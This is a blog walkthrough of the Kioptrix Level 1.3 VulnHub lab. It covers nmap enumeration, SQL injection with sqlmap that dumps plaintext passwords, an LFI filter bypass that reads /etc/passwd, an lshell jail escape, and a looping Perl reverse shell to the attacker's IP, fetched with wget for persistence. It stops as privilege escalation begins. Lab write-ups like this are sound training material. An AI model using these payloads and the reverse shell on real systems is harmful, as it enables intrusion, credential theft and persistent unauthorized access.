---
layout: post
title:  "Kioptrix: Level 1.3 (#4)"
date:   2019-05-14 13:47:35 +0000
author: Larry Brown
category: Walkthroughs
tags: [kioptrix]
---
    <div>VulnHub URL: <a target="_blank" href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/">https://www.vulnhub.com/entry/kioptrix-level-13-4,25/</a></div>
    <div>Hostname: Kioptrix4</div>
    <div>IP Address: 10.183.0.216</div>
    <div><br /></div>
    <div><br /></div>
    <div><h2>Information Gathering/Recon</h2></div>
    <div><br /></div>
    <div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.216.</div>
    <div><br /></div>
    <div><br /></div>
    <div><h2>Service Enumeration/Scanning</h2></div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4# nmap -Pn -sT -sV -A --script=default,banner -oA kioptrix4 -p- 10.183.0.216</div>
        <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-13 14:18 CDT</div>
        <div>Nmap scan report for 10.183.0.216   </div>
        <div>Host is up (0.0012s latency).</div>
        <div>Not shown: 39528 closed ports, 26003 filtered ports</div>
        <div>PORT    STATE SERVICE     VERSION   </div>
        <div>
            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</font>
        </div>
        <div>|_banner: SSH-2.0-<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">OpenSSH_4.7p1</font> Debian-8ubuntu1.2</div>
        <div>| ssh-hostkey:</div>
        <div>|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)</div>
        <div>|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)</div>
        <div>
            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</font>
        </div>
        <div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.2.8</font> (Ubuntu) <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">PHP/5.2.4-2ubuntu5.6</font> with Suhosin-Patch</div>
        <div>|_http-title: Site doesn't have a title (text/html).</div>
        <div>
            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</font>
        </div>
        <div>
            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">445/tcp open  netbios-ssn Samba smbd </font>
            <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">3.0.28a</font>
            <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;"> (workgroup: WORKGROUP)</font>
        </div>
        <div>MAC Address: 00:0C:29:B5:6F:61 (VMware)</div>
        <div>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</div>
        <div>TCP/IP fingerprint:</div>
        <div>OS:SCAN(V=7.70%E=4%D=5/13%OT=22%CT=1%CU=34051%PV=Y%DS=1%DC=D%G=Y%M=000C29%T</div>
        <div>OS:M=5CD9C360%P=x86_64-pc-linux-gnu)SEQ(SP=C4%GCD=1%ISR=CC%TI=Z%CI=Z%II=I%T</div>
        <div>OS:S=7)OPS(O1=M5B4ST11NW5%O2=M5B4ST11NW5%O3=M5B4NNT11NW5%O4=M5B4ST11NW5%O5=</div>
        <div>OS:M5B4ST11NW5%O6=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=1</div>
        <div>OS:6A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M5B4NNSNW5%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A</div>
        <div>OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%</div>
        <div>OS:Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=</div>
        <div>OS:A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=</div>
        <div>OS:Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%</div>
        <div>OS:T=40%CD=S)</div>
        <div>
            <div><br /></div>
        </div>
        <div>Network Distance: 1 hop</div>
        <div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
        <div>
            <div><br /></div>
        </div>
        <div>Host script results:</div>
        <div>|_clock-skew: mean: -2h59m57s, deviation: 2h49m42s, median: -4h59m57s</div>
        <div>|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</div>
        <div>| smb-os-discovery: </div>
        <div>|   OS: Unix (<font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Samba 3.0.28a</font>)</div>
        <div>|   Computer name: Kioptrix4</div>
        <div>|   NetBIOS computer name: </div>
        <div>|   Domain name: localdomain</div>
        <div>|   FQDN: Kioptrix4.localdomain</div>
        <div>|_  System time: 2019-05-13T10:19:48-04:00</div>
        <div>| smb-security-mode:</div>
        <div>|   account_used: guest</div>
        <div>|   authentication_level: user</div>
        <div>|   challenge_response: supported   </div>
        <div>|_  message_signing: disabled (dangerous, but default)</div>
        <div>|_smb2-time: Protocol negotiation failed (SMB2)</div>
        <div>
            <div><br /></div>
        </div>
        <div>TRACEROUTE</div>
        <div>HOP RTT     ADDRESS</div>
        <div>1   1.15 ms 10.183.0.216</div>
        <div>
            <div><br /></div>
        </div>
        <div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
        <div>Nmap done: 1 IP address (1 host up) scanned in 63.54 seconds</div>
    </div>
    <div><br /></div>
    <!--more-->
    <div><br /></div>
    <div><h2>Gaining Access</h2></div>
    <div><br /></div>
    <div>Checking on the software detected by nmap...</div>
    <ul>
        <li>
            <div>OpenSSH_4.7p1 - no relevant issues</div>
        </li>
        <li>
            <div>Apache/2.2.8 - no relevant issues</div>
        </li>
        <li>
            <div>PHP/5.2.4-2 - no relevant issues</div>
        </li>
        <li>
            <div>Samba 3.0.28a - no relevant issues</div>
        </li>
    </ul>
    <div><br /></div>
    <div>We don’t have any known vulnerabilities to exploit in the software we’ve detected so far. Time to start digging into the HTTP service on TCP port 80.</div>
    <div><br /></div>
    <div>The default site for the HTTP service contains a login form.</div>
    <div><br /></div>
    <div><img class="retina" src="/assets/images/2019-05-14-kioptrix-level-1.3/2898B5E0-2F5F-41E2-BF54-0B27ADE189D5.png" /><br /></div>
    <div><br /></div>
    <div>Trying some basic SQL injection in the username and password field...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>%' or 1=1 #</div>
    </div>
    <div><br /></div>
    <div>...I get the following error page.</div>
    <div><br /></div>
    <div><a href="http://10.183.0.216/member.php?username=">http://10.183.0.216/member.php?username=</a>%\%27%20or%201=1#</div>
    <div><br /></div>
    <div><img class="retina" src="/assets/images/2019-05-14-kioptrix-level-1.3/FE3A44BC-4FC0-4AA7-B1AA-1B72DC78D3EB.png" /><br /></div>
    <div><br /></div>
    <div>The SQL injection seems to work, but the login page doesn’t know which profile to load for me. Let’s see if we can use sqlmap to mine out data from the backend database.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4# sqlmap --har=sqlmap.log --data="myusername=test&amp;mypassword=test&amp;Submit=Login" --url="http://10.183.0.216/checklogin.php" -v3 --dbms=mysql --time-sec=1 --dbs</div>
        <div>[...snip...]</div>
        <div>POST parameter 'mypassword' is vulnerable. Do you want to keep testing the others (if any)? [y/N] </div>
        <div>sqlmap identified the following injection point(s) with a total of 334 HTTP(s) requests:</div>
        <div>---</div>
        <div>Parameter: mypassword (POST)</div>
        <div>    Type: boolean-based blind</div>
        <div>    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)</div>
        <div>    Payload: myusername=test&amp;mypassword=-8288' OR 1981=1981#&amp;Submit=Login</div>
        <div>    Vector: OR [INFERENCE]#</div>
        <div>---</div>
        <div>[14:35:23] [INFO] the back-end DBMS is MySQL</div>
        <div>web server operating system: Linux Ubuntu 8.04 (Hardy Heron)</div>
        <div>web application technology: PHP 5.2.4, Apache 2.2.8</div>
        <div>back-end DBMS: MySQL Unknown</div>
        <div>[...snip...]</div>
        <div>available databases [3]:</div>
        <div>[*] information_schema</div>
        <div>[*] members</div>
        <div>[*] mysql</div>
        <div>[...snip...]</div>
    </div>
    <div><br /></div>
    <div>The SQL injection vulnerability detected is a hard one to handle manually, so we’ll continue to rely on sqlmap to make all the requests for us. We already had sqlmap return the list of databases available. We’ll continue to mine out information from the members database.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4# sqlmap --har=sqlmap.log --data="myusername=test&amp;mypassword=test&amp;Submit=Login" --url="http://10.183.0.216/checklogin.php" -v3 --dbms=mysql --time-sec=1 -D members --tables</div>
        <div>[...snip...]</div>
        <div>Database: members</div>
        <div>[1 table]</div>
        <div>+---------+</div>
        <div>| members |</div>
        <div>+---------+</div>
        <div>[...snip...]</div>
    </div>
    <div><br /></div>
    <div>Only one table to look into. Let’s see what columns we have.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4# sqlmap --har=sqlmap.log --data="myusername=test&amp;mypassword=test&amp;Submit=Login" --url="http://10.183.0.216/checklogin.php" -v3 --dbms=mysql --time-sec=1 -D members -T members --columns</div>
        <div>[...snip...]</div>
        <div>Database: members</div>
        <div>Table: members</div>
        <div>[3 columns]</div>
        <div>+----------+-------------+</div>
        <div>| Column   | Type        |</div>
        <div>+----------+-------------+</div>
        <div>| id       | int(4)      |</div>
        <div>| password | varchar(65) |</div>
        <div>| username | varchar(65) |</div>
        <div>+----------+-------------+</div>
        <div>[...snip...]</div>
    </div>
    <div><br /></div>
    <div>OK. I'll pull all the data from the members table.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4# sqlmap --har=sqlmap.log --data="myusername=test&amp;mypassword=test&amp;Submit=Login" --url="http://10.183.0.216/checklogin.php" -v3 --dbms=mysql --time-sec=1 -D members -T members -C id,username,password --dump</div>
        <div>[...snip...]</div>
        <div>Database: members</div>
        <div>Table: members</div>
        <div>[2 entries]</div>
        <div>+----+----------+-----------------------+</div>
        <div>| id | username | password              |</div>
        <div>+----+----------+-----------------------+</div>
        <div>| 1  | john     | MyNameIsJohn          |</div>
        <div>| 2  | robert   | ADGAdsafdfwt4gadfga== |</div>
        <div>+----+----------+-----------------------+</div>
        <div>[...snip...]</div>
    </div>
    <div><br /></div>
    <div>Looks like john’s password is plain text and robert’s is base64 encoded (?). Or is it. The string doesn’t decode, so maybe that is just the “plain text" password.</div>
    <div><br /></div>
    <div>Trying both these usernames for the web login only results in a page displaying each user’s username and password.</div>
    <div><br /></div>
    <div>Before moving on, I’ll run dirb to make sure there aren’t any other directories on the server we might be missing.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4# dirb http://10.183.0.216 /usr/share/dirb/wordlists/big.txt -o dirb-http-10.183.0.216.txt</div>
        <div>
            <div><br /></div>
        </div>
        <div>-----------------</div>
        <div>DIRB v2.22    </div>
        <div>By The Dark Raver</div>
        <div>-----------------</div>
        <div>
            <div><br /></div>
        </div>
        <div>OUTPUT_FILE: dirb-http-10.183.0.216.txt</div>
        <div>START_TIME: Mon May 13 15:32:48 2019</div>
        <div>URL_BASE: http://10.183.0.216/</div>
        <div>WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt</div>
        <div>
            <div><br /></div>
        </div>
        <div>-----------------</div>
        <div>
            <div><br /></div>
        </div>
        <div>GENERATED WORDS: 20458                                                         </div>
        <div>
            <div><br /></div>
        </div>
        <div>---- Scanning URL: http://10.183.0.216/ ----</div>
        <div>+ http://10.183.0.216/cgi-bin/ (CODE:403|SIZE:327)                                                                                                   </div>
        <div>==&gt; DIRECTORY: http://10.183.0.216/images/                                                                                                           </div>
        <div>+ http://10.183.0.216/index (CODE:200|SIZE:1255)                                                                                                     </div>
        <div>==&gt; DIRECTORY: http://10.183.0.216/john/                                                                                                             </div>
        <div>+ http://10.183.0.216/logout (CODE:302|SIZE:0)                                                                                                       </div>
        <div>+ http://10.183.0.216/member (CODE:302|SIZE:220)                                                                                                     </div>
        <div>==&gt; DIRECTORY: http://10.183.0.216/robert/                                                                                                           </div>
        <div>+ http://10.183.0.216/server-status (CODE:403|SIZE:332)                                                                                              </div>
        <div>                                                                                                                                                     </div>
        <div>---- Entering directory: http://10.183.0.216/images/ ----</div>
        <div>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </div>
        <div>    (Use mode '-w' if you want to scan it anyway)</div>
        <div>                                                                                                                                                     </div>
        <div>---- Entering directory: http://10.183.0.216/john/ ----</div>
        <div>(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </div>
        <div>    (Use mode '-w' if you want to scan it anyway)</div>
        <div>                                                                                                                                                     </div>
        <div>---- Entering directory: http://10.183.0.216/robert/ ----</div>
        <div>(!) WARNING: Directory IS LISTABLE. No need to scan it.</div>
        <div>    (Use mode '-w' if you want to scan it anyway)</div>
        <div>
            <div><br /></div>
        </div>
        <div>-----------------</div>
        <div>END_TIME: Mon May 13 15:33:16 2019  </div>
        <div>DOWNLOADED: 20458 - FOUND: 5</div>
    </div>
    <div><br /></div>
    <div>Interesting. We found listable directories for our robert and john accounts. The PHP pages in their directories are the same as the ones displayed by the member.php page. This makes me wonder if the member.php page might be vulnerable to local file inclusion (LFI) attacks. The page would be taking the username parameter in the URL and building some kind of path that includes "$username/$username.php” (based on what we can tell). We might be able to use a null character in the query string to prevent the concatenation, and just request a specific file.</div>
    <div><br /></div>
    <div>Trying to request <a href="http://10.183.0.216/member.php?username=/etc/passwd%00">http://10.183.0.216/member.php?username=/etc/passwd%00</a>, we got the following helpful error message.</div>
    <div><br /></div>
    <div><img class="retina" src="/assets/images/2019-05-14-kioptrix-level-1.3/33305468-2C28-4E7D-A95B-3A977BD43412.png" /></div>
    <div><br /></div>
    <div>Looks like ‘etc’ was removed from my request. I’ll try /var/log/messages...</div>
    <div><br /></div>
    <div><img src="/assets/images/2019-05-14-kioptrix-level-1.3/F0F927D8-7B5B-4D4D-886D-FE7862741C6F.png" /></div>
    <div><br /></div>
    <div>Interesting. Looks like it tried to load the log file (without messing with the path), but didn’t have permission. Let’s see if we can request /etc/etc/passwd.</div>
    <div><br /></div>
    <div><img src="/assets/images/2019-05-14-kioptrix-level-1.3/F50356C9-C7E4-49E1-80F7-3C79AD3680DF.png" /></div>
    <div><br /></div>
    <div class="tip"><b>TIP:</b> To view the file in a ’text friendly’ format, use the “View Source” feature of the web browser.</div>
    <div><br /></div>
    <div>Bingo! Looks like whatever “filters” were in place were only removing the first instance of /etc.</div>
    <div><br /></div>
    <div>Looking at the list of users on the system, we can see that john and robert both have accounts. Maybe they are using the same passwords locally as we found in the database.</div>
    <div><br /></div>
    <div>Trying to SSH with john’s account...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4# ssh john@10.183.0.216</div>
        <div>john@10.183.0.216's password:</div>
        <div>Welcome to LigGoat Security Systems - We are Watching</div>
        <div>== Welcome LigGoat Employee ==</div>
        <div>LigGoat Shell is in place so you  don't screw up</div>
        <div>Type '?' or 'help' to get the list of allowed commands</div>
        <div>john:~$ </div>
    </div>
    <div><br /></div>
    <div>Trying to SSH with robert’s account...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4# ssh robert@10.183.0.216</div>
        <div>robert@10.183.0.216's password: </div>
        <div>Welcome to LigGoat Security Systems - We are Watching</div>
        <div>== Welcome LigGoat Employee ==</div>
        <div>LigGoat Shell is in place so you  don't screw up</div>
        <div>Type '?' or 'help' to get the list of allowed commands</div>
        <div>robert:~$</div>
    </div>
    <div><br /></div>
    <div>Looks like the passwords work for both accounts. I tried to run ’sudo -l’ from both, but it failed for both. </div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>john:~$ sudo -l</div>
        <div>*** forbidden sudo -&gt; sudo -l</div>
        <div><br /></div>
        <div>robert:~$ sudo -l</div>
        <div>*** forbidden sudo -&gt; sudo -l</div>
    </div>
    <div><br /></div>
    <div>I tried to check the $PATH variable and got the following message.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>robert:~$ echo $PATH</div>
        <div>*** forbidden path -&gt; "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"</div>
        <div>*** You have 0 warning(s) left, before getting kicked out.</div>
        <div>This incident has been reported.</div>
    </div>
    <div><br /></div>
    <div>Running the suggest ‘help’ command, we see the only commands available to us.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>robert:~$ help</div>
        <div>cd  clear  echo  exit  help  ll  lpath  ls</div>
    </div>
    <div><br /></div>
    <div>We seem to be in some type of “jail” shell. Doing some googling, it looks like we can break out of jail using the following command.</div>
    <div><br /></div>
    <div>From <a target="_blank" href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a> and <a target="_blank" href="https://www.aldeid.com/wiki/Lshell#Bypassing_lshell_with_os.system">https://www.aldeid.com/wiki/Lshell#Bypassing_lshell_with_os.system</a></div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>echo os.system('/bin/bash')</div>
    </div>
    <div><br /></div>
    <div>Let’s give it a try with john’s account.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4# ssh john@10.183.0.216</div>
        <div>john@10.183.0.216's password: </div>
        <div>Welcome to LigGoat Security Systems - We are Watching</div>
        <div>== Welcome LigGoat Employee ==</div>
        <div>LigGoat Shell is in place so you  don't screw up</div>
        <div>Type '?' or 'help' to get the list of allowed commands</div>
        <div>john:~$ echo os.system('/bin/bash')</div>
        <div>john@Kioptrix4:~$ id</div>
        <div>uid=1001(john) gid=1001(john) groups=1001(john)</div>
    </div>
    <div><br /></div>
    <div>Well, that was easy. Let’s see if john can do anything special.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>john@Kioptrix4:~$ sudo -l</div>
        <div>[sudo] password for john: </div>
        <div>Sorry, user john may not run sudo on Kioptrix4.</div>
    </div>
    <div><br /></div>
    <div>Nope! How about robert’s account...</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4# ssh robert@10.183.0.216</div>
        <div>robert@10.183.0.216's password: </div>
        <div>Welcome to LigGoat Security Systems - We are Watching</div>
        <div>== Welcome LigGoat Employee ==</div>
        <div>LigGoat Shell is in place so you  don't screw up</div>
        <div>Type '?' or 'help' to get the list of allowed commands</div>
        <div>robert:~$ echo os.system('/bin/bash')</div>
        <div>robert@Kioptrix4:~$ id</div>
        <div>uid=1002(robert) gid=1002(robert) groups=1002(robert)</div>
        <div>robert@Kioptrix4:~$ sudo -l</div>
        <div>[sudo] password for robert: </div>
        <div>Sorry, user robert may not run sudo on Kioptrix4.</div>
    </div>
    <div><br /></div>
    <div>Nope! But at least we have a shell.</div>
    <div><br /></div>
    <div>We’ll proceed under john’s unprivileged account.</div>
    <div><br /></div>
    <div><br /></div>
    <div><h2>Maintaining Access</h2></div>
    <div><br /></div>
    <div>This applies to the www-data user. See Additional Info below for gaining a shell as the www-data user...</div>
    <div><br /></div>
    <div>Since SSH is open on the victim, I checked to see if the www-data user has a default home directory and shell defined.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>www-data@Kioptrix4:/var/www$ grep `whoami` /etc/passwd</div>
        <div>www-data:x:33:33:www-data:/var/www:/bin/sh</div>
    </div>
    <div><br /></div>
    <div>The home directory exists, but only allows writes by root.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>drwxr-xr-x  5 root root  4096 May 13 12:27 www</div>
    </div>
    <div><br /></div>
    <div>Since we won’t be able to set up SSH keys, I decided to create a simple shell script that will try to connect back to my attacking machine every 5 minutes and use python’s SimpleHTTPServer to serve it up to the victim.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>root@kali:~/Walkthroughs/kioptrix4# cat session.www-data</div>
        <div>#!/bin/sh</div>
        <div>while true; do</div>
        <div>    perl -e 'use Socket;$i="10.183.0.222";$p=444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};'</div>
        <div>    # sleep for 300 seconds (5 mins)</div>
        <div>    sleep 300</div>
        <div>done</div>
        <div>root@kali:~/Walkthroughs/kioptrix4# python -m SimpleHTTPServer 432</div>
        <div>Serving HTTP on 0.0.0.0 port 432 ...</div>
        <div>10.183.0.216 - - [13/May/2019 16:51:25] "GET /session.www-data HTTP/1.0" 200 -</div>
    </div>
    <div><br /></div>
    <div>I uploaded the script to the victim's /tmp directory and ran it in the background. Now, if I get disconnected, I should be able to restart a listener and get back in within 5 minutes.</div>
    <div><br /></div>
    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
        <div>www-data@Kioptrix4:/var/www$ cd /tmp</div>
        <div>www-data@Kioptrix4:/tmp$ wget -O session.www-data 10.183.0.222:432/session.www-data</div>
        <div>--12:51:28--  http://10.183.0.222:432/session.www-data</div>
        <div>           =&gt; `session.www-data'</div>
        <div>Connecting to 10.183.0.222:432... connected.</div>
        <div>HTTP request sent, awaiting response... 200 OK</div>
        <div>Length: 308 [application/octet-stream]</div>
        <div>
            <div><br /></div>
        </div>
        <div>    0K                                                       100%   64.16 MB/s</div>
        <div>
            <div><br /></div>
        </div>
        <div>12:51:28 (64.16 MB/s) - `session.www-data' saved [308/308]</div>
        <div>
            <div><br /></div>
        </div>
        <div>www-data@Kioptrix4:/tmp$ chmod +x session.www-data</div>
        <div>www-data@Kioptrix4:/tmp$ ./session.www-data &amp;</div>
        <div>[1] 5605</div>
    </div>
    <div><br /></div>
    <div><br /></div>
    <div><h2>Privilege Escalation</h2></div>
    <div><br /></div>
    <div>Strangely, the /root directory allows anyone to access it...</div>
    <div><br /></div>
